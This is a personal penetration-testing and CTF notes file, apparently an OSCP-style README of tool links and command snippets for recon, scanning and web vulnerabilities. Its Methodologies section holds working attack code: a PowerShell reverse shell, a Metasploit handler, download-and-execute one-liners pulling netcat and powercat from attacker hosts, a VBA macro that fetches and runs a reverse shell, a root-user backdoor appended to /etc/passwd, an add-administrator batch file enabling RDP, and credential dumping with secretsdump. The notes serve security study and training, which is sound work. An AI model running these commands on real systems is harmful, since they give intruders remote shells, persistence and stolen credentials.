# Notes

## Table of Contents

<!-- markdown-toc --maxdepth 3 --bullets='-' -i README.md -->

<!-- toc -->

- [Reconnaissance](#reconnaissance)
  - [Passive Reconnaissance](#passive-reconnaissance)
  - [Active Reconnaissance](#active-reconnaissance)
- [Scanner](#scanner)
  - [Network Scanner](#network-scanner)
  - [Web Vulnerability Scanner](#web-vulnerability-scanner)
  - [Directory Bursting](#directory-bursting)
  - [Parameter Scanner](#parameter-scanner)
  - [Endpoint Scanner](#endpoint-scanner)
- [Penetration Testing](#penetration-testing)
  - [Tools](#tools)
  - [Training](#training)
  - [Methodologies](#methodologies)
- [Vulnerability](#vulnerability)
  - [Front-end](#front-end)
  - [XSS](#xss)
  - [Prototype Pollution](#prototype-pollution)
  - [CSS Injection](#css-injection)
  - [XS Leaks](#xs-leaks)
  - [DOM Clobbering](#dom-clobbering)
  - [XS-Leaks](#xs-leaks)
  - [SQL Injection (SQLi)](#sql-injection-sqli)
  - [SSTI](#ssti)
  - [CSRF](#csrf)
  - [401/403 Bypass](#401403-bypass)
  - [Path Taversal / Directory Traversal](#path-taversal--directory-traversal)
  - [Command Injection](#command-injection)
  - [DNS Rebind Attack](#dns-rebind-attack)
  - [SSRF](#ssrf)
  - [RCE](#rce)
  - [Information Disclosure](#information-disclosure)
  - [Apache Tomcat](#apache-tomcat)
  - [Curated](#curated)
- [CTF](#ctf)
  - [Self-Hosted CTF Platform](#self-hosted-ctf-platform)
  - [CTF Design](#ctf-design)
  - [Event](#event)
  - [Always online CTFs](#always-online-ctfs)
  - [Getting Started / Tutorials](#getting-started--tutorials)
  - [Other](#other-1)
- [Pwn](#pwn)
  - [Notes](#notes)
  - [Challenges / Wargames](#challenges--wargames)
  - [Tools](#tools-1)
  - [Solver Script Template](#solver-script-template)
  - [Assembly](#assembly)
  - [Disassembly](#disassembly)
  - [Shellcode](#shellcode)
  - [x86](#x86)
  - [x86_64](#x86_64)
  - [Format String Attack](#format-string-attack)
  - [ELF](#elf)
  - [Heap](#heap)
- [Reversing](#reversing)
  - [Windows](#windows)
  - [Python](#python)
  - [Android](#android)
  - [dotnet](#dotnet)
  - [ysoserial.net](#ysoserialnet)
- [Web](#web)
  - [Specification](#specification)
  - [Vulnerability research approach](#vulnerability-research-approach)
  - [Burp Suite](#burp-suite)
  - [OWASP](#owasp)
  - [Training](#training-1)
  - [Web Assembly](#web-assembly)
  - [Web API](#web-api)
  - [GraphQL](#graphql)
  - [Json Web Token (JWT)](#json-web-token-jwt)
  - [Simple HTTP Server](#simple-http-server)
  - [Browser Extension](#browser-extension)
  - [RDBMS](#rdbms)
  - [Web Archiver](#web-archiver)
  - [Python Flask](#python-flask)
  - [Service Worker](#service-worker)
  - [Web Browser](#web-browser)
  - [XMPP](#xmpp)
  - [Web application frameworks benchmark](#web-application-frameworks-benchmark)
- [Crypto](#crypto)
  - [Hash Length Extension](#hash-length-extension)
  - [oneliner](#oneliner)
  - [knonw plaintext attack](#knonw-plaintext-attack)
- [Forensics](#forensics)
  - [Steganography](#steganography)
  - [DFIR](#dfir)
  - [Memory](#memory)
  - [Other](#other-2)
- [Networking](#networking)
  - [SSL/TLS](#ssltls)
  - [openssl](#openssl)
- [OSINT](#osint)
- [Game Hacking](#game-hacking)
- [Wi-Fi](#wi-fi)
- [GitHub](#github)
  - [Dork](#dork)
  - [GraphQL API: Query Example](#graphql-api-query-example)
- [Bug Bounty](#bug-bounty)
  - [Platform](#platform)
  - [Available Programs](#available-programs)
  - [Curated](#curated-1)
  - [Getting Started / Tutorials](#getting-started--tutorials-1)
  - [Writeup](#writeup)
  - [Blog](#blog)
  - [Tools](#tools-2)
  - [Other](#other-3)
- [Code Snippets](#code-snippets)
- [Code Analysis](#code-analysis)
  - [Static Code Analysis](#static-code-analysis)
- [Linux](#linux)
  - [Bash snippet](#bash-snippet)
  - [Kali Linux](#kali-linux)
- [Windows](#windows-1)
  - [Active Directory (AD)](#active-directory-ad)
  - [Unquoted Service](#unquoted-service)
  - [Powershell](#powershell)
  - [AD CS (Active Directory Certificates Service)](#ad-cs-active-directory-certificates-service)
  - [Install Microsoft 365 free](#install-microsoft-365-free)
  - [RDP](#rdp)
  - [RDP over SSH](#rdp-over-ssh)
  - [smbclient](#smbclient)
  - [Tools](#tools-3)
- [Virtualization](#virtualization)
  - [virt-manager](#virt-manager)
- [Programming language](#programming-language)
  - [Python](#python-1)
  - [Lua](#lua)
  - [PHP](#php)
  - [JavaScript](#javascript)
  - [Ruby](#ruby)
  - [Scheme](#scheme)
  - [Java](#java)
  - [Erlang](#erlang)
  - [Common Lisp](#common-lisp)
  - [C++](#c)
  - [PowerShell](#powershell-2)
  - [Markdown](#markdown)
  - [Sandbox Service](#sandbox-service)
  - [Source Code Hosting](#source-code-hosting)
- [Data Structures & Algorithms](#data-structures--algorithms)
- [Computer Scinence](#computer-scinence)
- [Machine Learning / Deep Learning](#machine-learning--deep-learning)
- [Emacs](#emacs)
- [Static Site Generator](#static-site-generator)
- [Certificates](#certificates)
  - [OSCP (Offensive Security Certified Professional)](#oscp-offensive-security-certified-professional)
- [Tools](#tools-4)
  - [netcat](#netcat)
- [Media](#media)
  - [Book](#book)
  - [Scholarly Articles, Academic Paper](#scholarly-articles-academic-paper)
  - [Video](#video)
  - [Podcast](#podcast)
- [Stuff](#stuff)

<!-- tocstop -->

## Reconnaissance

### Passive Reconnaissance

- [PasteHunter](https://github.com/kevthehermit/PasteHunter) - Scanning pastebin with yara rules
- [theHarvester](https://github.com/laramies/theHarvester) - E-mails, subdomains and names Harvester - OSINT

#### Domain / DNS

- [DNSdumpster.com](https://dnsdumpster.com/) - dns recon & research, find & lookup dns records
- [ViewDNS.info](https://viewdns.info/) - Your one source for DNS related tools!
- [crt.sh](https://crt.sh/) - Certificate Search
- [Sublist3r](https://github.com/aboul3la/Sublist3r) - Fast subdomains enumeration tool for penetration testers
- [subbrute](https://github.com/TheRook/subbrute) - A DNS meta-query spider that enumerates DNS records, and subdomains
- [dnsrecon](https://github.com/darkoperator/dnsrecon) - DNS Enumeration Script
- [massdns](https://github.com/blechschmidt/massdns) - A high-performance DNS stub resolver for bulk lookups and reconnaissance (subdomain enumeration)
- [puredns](https://github.com/d3mondev/puredns) - Puredns is a fast domain resolver and subdomain bruteforcing tool that can accurately filter out wildcard subdomains and DNS poisoned entries
- [resolvers](https://github.com/trickest/resolvers) - The most exhaustive list of reliable DNS resolvers
- [DNS servers in Japan](https://public-dns.info/nameserver/jp.html)

#### API Search

- [ApisList](https://apislist.com/) - The Public APIs List, a curated list for the public web Apis
- [RapidAPI](https://rapidapi.com/hub) - API Hub - Free Public & Open Rest APIs | Rapid
- [APIs.guru](https://apis.guru/) - create a machine-readable Wikipedia for Web APIs in the OpenAPI Specification format

#### Search Engine

- [Shodan Search Engine](https://www.shodan.io/) - A search engine for Internet-connected devices
  - [Shodan Dorks](https://www.kitploit.com/2024/03/shodan-dorks.html) - Shodan Dorks by twitter.com/lothos612  Feel free to make suggestions
- [Censys Search](https://search.censys.io/) - Censys helps organizations, individuals, and researchers find and monitor every server on the Internet to reduce exposure and improve security

#### Internet archives search

- [waymore](https://github.com/xnl-h4ck3r/waymore)

  ```bash
  python3 ~/tools/waymore/waymore.py -i DOMAIN -oR ./waymore/$(date +%Y%m%d-%H%m%s)
  ```

#### Secret scanning

- [trufflehog](https://github.com/trufflesecurity/trufflehog)

  ```bash
  trufflehog filesystem <path> --json | grep -v AlgoliaAdminKey
  trufflehog github --repo=https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments
  ```

#### File search

- [gf](https://github.com/tomnomnom/gf)

  ```bash
  # Install and Setup
  go install github.com/tomnomnom/gf@latest

  git clone https://github.com/tomnomnom/gf.git ~/tools/gf
  cp -r ~/tools/gf/examples/ ~/.gf

  # list available pattern
  gf -list

  # check pattern
  gf -dump urls
  ```

##### gf pattern

- [1ndianl33t/Gf-Patterns](https://github.com/1ndianl33t/Gf-Patterns)
- [emadshanab/Gf-Patterns-Collection](https://github.com/emadshanab/Gf-Patterns-Collection)

#### Other

- [The Recon-ng Framework](https://github.com/lanmaster53/recon-ng) - Open Source Intelligence gathering tool aimed at reducing the time spent harvesting information from open sources
- [Hunter](https://hunter.io/) - Hunter is your all-in-one email outreach platform
- [Buckets Listing](https://buckets.grayhatwarfare.com/buckets?type=aws) - Public Buckets by GrayhatWarfare
- [BuiltWith Technology Lookup](https://builtwith.com/) - Find out what websites are Built With
- [fast-recon](https://github.com/DanMcInerney/fast-recon) - Does some google dorks against a domain
- [厚生年金保険・健康保険　適用事業所検索システム \| 日本年金機構](https://www2.nenkin.go.jp/do/search_section/)

### Active Reconnaissance

- TLS Certificates without SNI

  ```bash
  openssl s_client -connect example.com:443 -showcerts < /dev/null
  ```

- TLS Certificates with SNI

  ```bash
  openssl s_client -connect example.com:443 -servername example.com -showcerts < /dev/null
  ```

## Scanner

### Network Scanner

Nmap

```bash
nmap -p- --min-rate 5000 -sVC -Pn --open 192.168.0.123

# slow scan
nmap --top-ports=100 -T2 192.168.0.123
```

`-T` Option

- [Timing Templates (-T) \| Nmap Network Scanning](https://nmap.org/book/performance-timing-templates.html)
- [Timing and Performance \| Nmap Network Scanning](https://nmap.org/book/man-performance.html)

Scanning Active Directory Controller

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sVC -sT -Pn <ip>
```

### Web Vulnerability Scanner

- [nikto](https://github.com/sullo/nikto) - web server scanner

  ```bash
  # check proxy setting
  grep PROXY /etc/nikto.conf

  nikto -useproxy -Pause 1 -host https://${DOMAIN}/
  ```

- [whatweb](https://github.com/urbanadventurer/WhatWeb) - Web scanner

  ```bash
  whatweb --user-agent "hackerone_researcher_4n86rakam1" -a 3 https://${DOMAIN}/
  whatweb --proxy 127.0.0.1:8080 -a 3 --max-threads 1 https://${DOMAIN}/
  ```

### Directory Bursting

- [ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer written in Go

  ```bash
  mkdir -p ffuf
  ffuf -ic -u https://${DOMAIN}/FUZZ -w /usr/share/wordlists/dirb/common.txt -r -t 2 -p 0.5-1 -ic -of all -o ffuf/$(date +%Y%m%d-%H%M%S)
  ```

### Parameter Scanner

- [Paramspider](https://github.com/devanshbatham/ParamSpider) - Find HTTP Query Parameter from web.archive.org

  ```bash
  ~/tools/ParamSpider/paramspider.py -d ${DOMAIN} --exclude woff,png,svc,jpg --output ./paramspider/$(date +%Y%m%d-%H%M%S).txt

  # with gf
  gf xss ./paramspider
  ```

- [Arjun](https://github.com/s0md3v/Arjun) - HTTP parameter discovery suite

  ```bash
  arjun -u http://${DOMAIN}/

  # via proxy
  HTTP_PROXY=http://127.0.0.1:8080 HTTPS_PROXY=http://127.0.0.1:8080 arjun -u https://${DOMAIN}/ --stable --headers "User-Agent: hackerone_researcher_<yourname>"
  ```

### Endpoint Scanner

- [LinkFinder](https://github.com/GerbenJavado/LinkFinder) - A python script that finds endpoints in JavaScript files

  ```bash
  mkdir -p LinkFinder
  ~/tools/LinkFinder/linkfinder.py -i https://${DOMAIN} -o cli > LinkFinder/$(date +%Y%m%d-%H%M%S).txt

  ## Burp input
  ~/tools/LinkFinder/linkfinder.py -i burpfile -b -o cli > ${DOMAIN}.txt
  ```

- [JSScanner](https://github.com/dark-warlord14/JSScanner/blob/master/script.sh) - Scan JavaScript Files to find endpoints

  ```bash
  echo https://${DOMAIN} > domains.txt
  ~/tools/JSScanner/script.sh domains.txt

  # Find URL with gf
  gf urls ./Jsscanner_results
  ```

- Download the same domain JavaScript URL

  ```bash
  mkdir -p javascripts
  echo https://${DOMAIN}/ | hakrawler | grep -iahE "https?://[^\"\\'> ]+\\.js" | grep -E "//${DOMAIN}" | sort -u | xargs wget -x -P javascripts -q
  find javascripts -type f -name "*.js" -exec js-beautify -r {} +
  ```

- [relative-url-extractor](https://github.com/jobertabma/relative-url-extractor) - A small tool that extracts relative URLs from a file
- [xnLinkFinder](https://github.com/xnl-h4ck3r/xnLinkFinder) - A python tool used to discover endpoints, potential parameters, and a target specific wordlist for a given target

## Penetration Testing

- [PENETRATION TESTING PRACTICE LAB - VULNERABLE APPS / SYSTEMS](https://www.amanhardikar.com/mindmaps/Practice.html)
- [The Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Main_Page)
- [Penetration test - Wikipedia](https://en.wikipedia.org/wiki/Penetration_test)
- [WSTG](https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies)
- [Penetration Testing Methodology, Part 1/6 — Recon](https://medium.com/dvlpr/penetration-testing-methodology-part-1-6-recon-9296c4d07c8a)
- [enaqx/awesome-pentest](https://github.com/enaqx/awesome-pentest)
- [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/)
- [Basic Pentesting: 1 ~ VulnHub](https://www.vulnhub.com/entry/basic-pentesting-1,216/)
- [PenTest.WS](https://pentest.ws/)
- [Pentest-Tools.com](https://pentest-tools.com/)
- [MITRE ATT&CK®](https://attack.mitre.org/)
- [Red Team Reconnaissance Techniques](https://www.linode.com/docs/guides/red-team-reconnaissance-techniques/)
- [Red Team Notes](https://dmcxblue.gitbook.io/red-team-notes/)

### Tools

- [GTFOBins](https://gtfobins.github.io/) - GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
- [WADComs](https://wadcoms.github.io/) - WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.
- [LOLBAS](https://lolbas-project.github.io/) - Living Off The Land Binaries, Scripts and Libraries
- [explainshell.com](https://www.explainshell.com/) - match command-line arguments to their help text
- [Penetration Testing Tools](https://en.kali.tools/) - Kali Linux Tools Listing
- [Exploit Database Search](https://www.exploit-db.com/search) - Search Exploit Database for Exploits, Papers, and Shellcode

### Training

- [TryHackMe](https://tryhackme.com/dashboard)
- [Hack The Box](https://app.hackthebox.com/home)
- [VulnHub](https://www.vulnhub.com/)
- [Root Me](https://www.root-me.org/?lang=en)
- [PentesterLab](https://pentesterlab.com/)

### Methodologies

#### Reverse Shell

- [Reverse Shell Generator](https://www.revshells.com/)
- [php-reverse-shell \| pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
- [MSFvenom - Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/msfvenom/)
- [msfvenom \| OSCP Notes](https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/)
- [Shells · Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html)
- [Controlling your server with a reverse shell attack \| Snyk](https://snyk.io/blog/reverse-shell-attack/)
- [hoaxshell](https://github.com/t3l3machus/hoaxshell)
- [Villain](https://github.com/t3l3machus/Villain)
- [Offensive-Reverse-Shell-Cheat-Sheet](https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet)
- [Shell3er](https://github.com/yehia-mamdouh/Shell3er)

##### PowerShell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex ". { $data } 2>&1" | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

##### Listening

Metasploit Framework multi/handler payload

```bash
msfconsole -q -x "use exploit/multi/handler;\
                          set PAYLOAD windows/meterpreter/reverse_tcp;\
                          set LHOST 192.168.119.128;\
                          set LPORT 443;\
                          run"
```

#### Full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg;
export SHELL=/bin/bash; export TERM=screen; stty rows 81 columns 238; reset;
```

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
ctrl Z
stty raw -echo; fg
reset
```

- [Full TTYs - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
- [Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [Upgrading simple (reverse-)shells to fully interactive TTYs](https://gist.github.com/rollwagen/1fdb6b2a8cd47a33b1ecf70fea6aafde)

#### Persistence

- [nohup](https://www.gnu.org/software/coreutils/manual/html_node/nohup-invocation.html#nohup-invocation)
- [besimorhino/powercat](https://github.com/besimorhino/powercat) - netshell features all in version 2 powershell
- [Windows Powershell nohup](https://qiita.com/aimpast/items/dbf20b94a102a37ca6bc)

```powershell
Invoke-Wmimethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5/powercat.ps1'); mycat -c 10.10.16.5 -p 443 -e powershell;"
```

##### Create root user

```bash
# foo:$1$mysalt$4Lz7hS.y2V54mV2gJXEKR/:0:0::/tmp/foo:/bin/bash
echo foo:$(openssl passwd -1 -salt mysalt password):0:0::/tmp/foo:/bin/bash >> /etc/passwd

# login with password user
su foo  # enter 'password'
```

windows add-admin.bat

```bat
@ECHO OFF
:: This batch file adds user to Administrator and enables RDP
Title Add user
echo Adding user...
net user myadmin password1@ /add
net localgroup Administrators myadmin /add
net localgroup "Remote Desktop Users" hoge /add
ECHO Enabling RDP...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
ECHO ====================
ECHO User added
ECHO ====================
net users
```

#### Privilege Escalation

- [Windows elevation of privileges](https://guif.re/windowseop)
- [local_exploit_suggester.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)

Identify process Windows

```bat
:: netstat -> tasklist
netstat -ano | findstr TCP | findstr ":0"
:: =>   TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2820

tasklist /v | findstr 2820
:: => CloudMe.exe                   2820                            0     37,444 K Unknown         N/A                                                     0:00:00 N/A
```

- [RunasCs.exe](https://github.com/antonioCoco/RunasCs) - The binary link: [v1.5](https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip)

```cmd
RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
```

- [PrivescCheck](https://github.com/itm4n/PrivescCheck) - Privilege Escalation Enumeration Script for Windows
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

#### Credential Access & Dumping

- [Dumping and Cracking mscash - Cached Domain Credentials - Red Teaming Experiments](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials#secretsdump)
- [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) - A little tool to play with Windows security

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL -outputfile hash
```

#### Host Discovery

Ping Sweep

```bash
base="192.168.0"; seq 1 254 | xargs -P 100 -I {} sh -c "ping -W 2 -c 2 $base.{} 2>/dev/null 1>&2 && echo $base.{}"
```

Nmap ping scan `-sn` option

```bash
nmap -sn --min-rate 5000 192.168.0.0/24
```

#### Port Forwarding

##### SSH Port Forwarding

Dynamic

```bash
ssh -N -D 127.0.0.1:8080 user@10.11.1.252
```

/etc/proxychains.conf

```bash
socks4 127.0.0.1 9050
```

proxychains and Nmap

```bash
proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
```

local port forwarding

```bash
ssh -N -L 0.0.0.0:445:<target ip>:445 j0hn@10.11.1.252
```

##### chisel

[jpillora/chisel](https://github.com/jpillora/chisel)

```bash
curl -sL https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -o- | zcat > chisel
chmod +x ./chisel
```

Attacker

```bash
./chisel -p 25 --reverse
```

Target

```bash
# 127.0.0.1:8080 is in target, R:3000 is in host machine
./chisel client --max-retry-count 0 <kali ip>:25 R:3000:127.0.0.1:8080

./chisel client --max-retry-count 0 <kali ip>:25 R:3000:10.10.14.16:8080

./chisel client --max-retry-count 0 192.168.119.128:25 R:3306:10.5.5.11:3306
```

socks proxy

[Reverse SOCKS Proxy Using Chisel — The Easy Way \| by Vegard Wærp \| Medium](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)

Target

```bash
./chisel client --max-retry-count 0 192.168.119.128:25 R:socks
```

- [Tunneling and Port Forwarding - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)

#### Lateral movement

- [Derivative Local Admin. Intro | by Justin Warner | Medium](https://sixdub.medium.com/derivative-local-admin-cdd09445aac8)

#### File Transfer

##### PowerShell

Download file

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.186/nc.exe', 'C:\Windows\Tasks\nc.exe');
```

Download and execute

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.2.242/nc.exe')
```

PowerShell in cmd.exe

```cmd
:: download and save file
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.156/nc.exe', 'C:\Windows\Tasks\nc.exe')"

:: download and output
powershell -c "(New-Object System.Net.WebClient).DownloadString('http://10.11.2.242/test.ps1')"
```

powercat

```powershell
# Load The Function From URL:
IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5/powercat.ps1')

# Send File:
powercat -c 10.1.1.1 -p 443 -i C:\inputfile

# Recieve File:
powercat -l -p 8000 -of C:\inputfile
```

##### cmd.exe

```cmd
cmd /c bitsadmin /transfer pwn /download http://192.168.119.156/nc.exe C:\Windows\Tasks\nc.exe
bitsadmin /transfer pwn /download http://192.168.119.156/nc.exe C:\Windows\Tasks\nc.exe
bitsadmin /transfer pwn /download http://10.11.2.242/PrintSpoofer64.exe C:\Windows\Tasks\PrintSpoofer64.exe
certutil.exe -urlcache -split -f "http://192.168.119.156/nc.exe" nc.exe
```

- [Basic Win CMD for Pentesters - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#download)

##### VBA Macro

```cmd
Dim Str As String
Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.119.137:8000/reverse-shell.txt'); iex 'powershell -E $code'"""
CreateObject("Wscript.Shell").Run Str
```

- [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

##### SMB file share

```bash
# Kali
impacket-smbserver <user> .
impacket-smbserver -smb2support <user> .
```

```cmd
:: Victim
:: Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
net use * \\<ip>\<user>
```

#### Wordlist

- [SecLists](https://github.com/danielmiessler/SecLists) - List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
- [Assetnote Wordlists](https://wordlists.assetnote.io/) - This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.
- [crunch](https://sourceforge.net/projects/crunch-wordlist/) - Crunch is a wordlist generator where you can specify a standard character set or a character set you specify. crunch can generate all possible combinations and permutations.
- [RSMangler](https://github.com/digininja/RSMangler) - RSMangler will take a wordlist and perform various manipulations on it similar to those done by John the Ripper with a few extras.
- [wordlistctl](https://github.com/BlackArch/wordlistctl) - Fetch, install and search wordlist archives from websites and torrent peers
- [mentalist](https://github.com/sc0tfree/mentalist) - Mentalist is a graphical tool for custom wordlist generation. It utilizes common human paradigms for constructing passwords and can output the full wordlist as well as rules compatible with Hashcat and John the Ripper
- [english-words](https://github.com/dwyl/english-words) - A text file containing 479k English words for all your dictionary/word-based projects e.g: auto-completion / autosuggestion
- [username-anarchy](https://github.com/urbanadventurer/username-anarchy) - Username tools for penetration testing
- [jwt-secrets](https://github.com/wallarm/jwt-secrets)

custom wordlist from HTML

```bash
curl -s http://runner.htb/ | html2text | tr ' ' '\n' | tr -d '.,:*!' | sort -u > list.txt
```

#### Post Exploitation

- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - A swiss army knife for pentesting networks
- [NetExec](https://github.com/Pennyw0rth/NetExec) - The Network Execution Tool, based on CrackMapExec
- [Nishang](https://github.com/samratashok/nishang) - Offensive PowerShell for red team, penetration testing and offensive security
- [PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite) - This is a collection of PowerShell utilities
- [Powershell-PostExploitation](https://github.com/xpn/Powershell-PostExploitation) - Scripts created to help with post exploitation of a Windows host

## Vulnerability

- [CVE](https://www.cve.org/) - Common Vulnerabilities and Exposures
- [cvelistV5](https://github.com/CVEProject/cvelistV5) - CVE cache of the official CVE List in CVE JSON 5.0 format
- [CVE Researcher Reservation Guidelines](https://github.com/CVEProject/cveproject.github.io/blob/gh-pages/requester/reservation-guidelines.md)
- [Search CVE List](https://cve.mitre.org/cve/search_cve_list.html)
- [NVD](https://nvd.nist.gov/vuln/search) - National Vulnerability Database
- [CWE](https://cwe.mitre.org/) - Common Weakness Enumeration
- [CAPEC](https://capec.mitre.org/) - Common Attack Pattern Enumeration and Classification (CAPEC™)

### Front-end

- [Beyond XSS](https://aszx87410.github.io/beyond-xss/en/) - Explore the Web Front-end Security Universe
- [BlackFan/content-type-research](https://github.com/BlackFan/content-type-research)
- [RenwaX23/XSS-Payloads](https://github.com/RenwaX23/XSS-Payloads) - List of XSS Vectors/Payloads

### XSS

- [Cross-site scripting contexts | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [Cross-Site Scripting (XSS) Cheat Sheet - 2023 Edition \| Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [XSS Hunter](https://xsshunter.trufflesecurity.com/app/#/)
- [What is Cross-site Scripting and How Can You Fix it?](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
- [CTFのWebセキュリティにおけるXSSまとめ（PRSSI, XFS, CSS Injection）](https://blog.hamayanhamayan.com/entry/2021/12/07/231441)
- [Tiny XSS Payloads](https://tinyxss.terjanq.me/)
- [Cross Site Scripting - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)
- [Browser's XSS Filter Bypass Cheat Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
- [s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
- [traxss](https://github.com/M4cs/traxss)

Refrected XSS checker

```bash
#!/usr/bin/env bash

random_str=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)

# payload="${random_str}<>?,.:\";'{}|[]\\()_+&#!"

# url encoded
payload="${random_str}%3C%3E%22%27,.:;%7B%7D%7C%5B%5D%5C()_+\&?"
echo paylaod: ${payload}

while IFS= read -r url; do
    fuzz_url=$(echo "${url}" | sed -e "s/FUZZ/${payload}/g")
    echo test: "${fuzz_url}"

    curl --proxy http://127.0.0.1:8080 -k -s -A "hackerone_reseacher_<yourname>" "${fuzz_url}" \
        | grep --color=always -oP ".{0,10}${random_str}.{0,40}"

    echo

    sleep 2
done < param-urls.txt

# param-urls.txt is
# http://example.com/id=FUZZ
```

### Prototype Pollution

Prototype Pollution to RCE (PP2R)

- [OurChallenges/XNUCA2019Qualifier/Web/hardjs at master · NeSE-Team/OurChallenges](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs)
- [Node.jsでプロトタイプ汚染後に任意コード実行まで繋げた事例 - knqyf263's blog](https://knqyf263.hatenablog.com/entry/2020/08/11/050342)

### CSS Injection

- [Testing for CSS Injection \| OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)
- [CSS Injection \| HackTricks](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)
- [CSS Injection \| XS-Leaks Wiki](https://xsleaks.dev/docs/attacks/css-injection/)
- [CSSインジェクション \| 技術者ブログ \| 三井物産セキュアディレクション株式会社](https://www.mbsd.jp/research/20230403/css-injection/)
- [Blind CSS Exfiltration: exfiltrate unknown web pages \| PortSwigger Research](https://portswigger.net/research/blind-css-exfiltration)
- [The Sexy Assassin Tactical Exploitation using CSS. - ppt download](https://slideplayer.com/slide/3493669/)
- [hackvertor/blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration)
- [m---/onsen](https://github.com/m---/onsen)

### XS Leaks

- [Introduction \| XS-Leaks Wiki](https://xsleaks.dev/)
- [XS-Search/XS-Leaks \| HackTricks \| HackTricks](https://book.hacktricks.xyz/pentesting-web/xs-search)

### DOM Clobbering

- [DOM clobbering - Wikipedia](https://en.wikipedia.org/wiki/DOM_clobbering)
- [DOM clobbering \| Web Security Academy](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM Clobbering まとめ – やっていく気持ち](https://diary.shift-js.info/dom-clobbering/)
- [XSS in GMail's AMP4Email via DOM Clobbering - research.securitum.com](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
- [DOM Clobbering strikes back \| PortSwigger Research](https://portswigger.net/research/dom-clobbering-strikes-back)
- [Hijacking service workers via DOM Clobbering \| PortSwigger Research](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

### XS-Leaks

- [Introduction \| XS-Leaks Wiki](https://xsleaks.dev/)

### SQL Injection (SQLi)

- [SQL Injection Payload List. PayloadBox | by #ismailtasdelen | Medium](https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b)
- [The SQL Injection Knowledge Base](https://www.websec.ca/kb/sql_injection)
- [payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)
